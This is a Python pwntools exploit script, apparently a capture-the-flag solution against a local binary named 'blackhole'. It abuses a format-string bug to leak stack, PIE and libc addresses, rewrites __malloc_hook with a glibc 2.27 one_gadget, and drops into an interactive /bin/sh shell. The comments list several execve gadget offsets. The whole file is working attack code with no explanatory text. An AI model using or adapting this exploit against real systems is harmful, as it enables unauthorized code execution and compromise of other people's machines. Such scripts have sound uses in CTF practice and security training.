from pwn import *

context.log_level = 'debug'

def send(data, wait = True):
    if isinstance(data, str):
        data = data.encode()
    z.send(data + b'\n\0')
    if wait:
        return z.recvline()
    else:
        sleep(0.1)

libc = ELF('./libc-2.27.so')
#  0x4f2c5 execve("/bin/sh", rsp+0x40, environ)
#  constraints:
#    rsp & 0xf == 0
#    rcx == NULL

#  0x4f322 execve("/bin/sh", rsp+0x40, environ)
#  constraints:
#    [rsp+0x40] == NULL

#  0xe569f execve("/bin/sh", r14, r12)
#  constraints:
#    [r14] == NULL || r14 == NULL
#    [r12] == NULL || r12 == NULL

#  0xe5858 execve("/bin/sh", [rbp-0x88], [rbp-0x70])
#  constraints:
#    [[rbp-0x88]] == NULL || [rbp-0x88] == NULL
#    [[rbp-0x70]] == NULL || [rbp-0x70] == NULL

#  0xe585f execve("/bin/sh", r10, [rbp-0x70])
#  constraints:
#    [r10] == NULL || r10 == NULL
#    [[rbp-0x70]] == NULL || [rbp-0x70] == NULL

#  0xe5863 execve("/bin/sh", r10, rdx)
#  constraints:
#    [r10] == NULL || r10 == NULL
#    [rdx] == NULL || rdx == NULL

#  0x10a38c execve("/bin/sh", rsp+0x70, environ)
#  constraints:
#    [rsp+0x70] == NULL

#  0x10a398 execve("/bin/sh", rsi, [rax])
#  constraints:
#    [rsi] == NULL || rsi == NULL
#    [[rax]] == NULL || [rax] == NULL

while True:
    try:
        z = remote('localhost', 1111)
        #  r = process('./blackhole', stderr=-1)

        # fd = 1
        send('%{}c%7$hn'.format(0x6010), False) # chances are, depend on PIE
        send('%{}c%9$hhn'.format(1), False)
        send('')

    except EOFError:
        z.close()
        continue

    # leak
    res          = send('%5$lx.%6$lx.%10$lx').split(b'.')
    stack        = int(res[0], 16)
    pie          = int(res[1], 16) - 0x11fa
    libc.address = int(res[2], 16) - 0x21b97
    success('stack=%x' % stack)
    success('pie=%x' % pie)
    success('libc=%x' % libc.address)

    # 8$ = &__malloc_hook
    t = (stack & 0xff) + 0x8
    send('%{}c%5$hhn'.format(t))
    send('%{}c%7$hn'.format(libc.sym.__malloc_hook & 0xffff))
    send('%{}c%5$hhn'.format(t + 2))
    send('%{}c%7$hn'.format((libc.sym.__malloc_hook >> 16) & 0xffff))
    send('%{}c%5$hhn'.format(t + 4))
    send('%{}c%7$hn'.format((libc.sym.__malloc_hook >> 32) & 0xffff))

    # 9$ = &__malloc_hook+2
    t += 8
    send('%{}c%5$hhn'.format(t))
    send('%{}c%7$hn'.format(libc.sym.__malloc_hook + 2 & 0xffff))
    send('%{}c%5$hhn'.format(t + 2))
    send('%{}c%7$hn'.format((libc.sym.__malloc_hook >> 16) & 0xffff))
    send('%{}c%5$hhn'.format(t + 4))
    send('%{}c%7$hn'.format((libc.sym.__malloc_hook >> 32) & 0xffff))

    # 10$ = &__malloc_hook+4
    t += 8
    send('%{}c%5$hhn'.format(t))
    send('%{}c%7$hn'.format(libc.sym.__malloc_hook + 4 & 0xffff))
    send('%{}c%5$hhn'.format(t + 2))
    send('%{}c%7$hn'.format((libc.sym.__malloc_hook >> 16) & 0xffff))
    send('%{}c%5$hhn'.format(t + 4))
    send('%{}c%7$hn'.format((libc.sym.__malloc_hook >> 32) & 0xffff))

    # __malloc_hook = one_gadget
    one = libc.address + 0xe569f
    parr = [ (one & 0xffff, 8),
             (one >> 16 & 0xffff, 9),
             (one >> 32 & 0xffff, 10) ]
    parr.sort()
    payload = ''
    count = 0
    for data, off in parr:
        payload += '%{}c%{}$hn'.format(data - count, off)
        count = data
    send(payload)

    send('pwned', False)
    z.interactive()
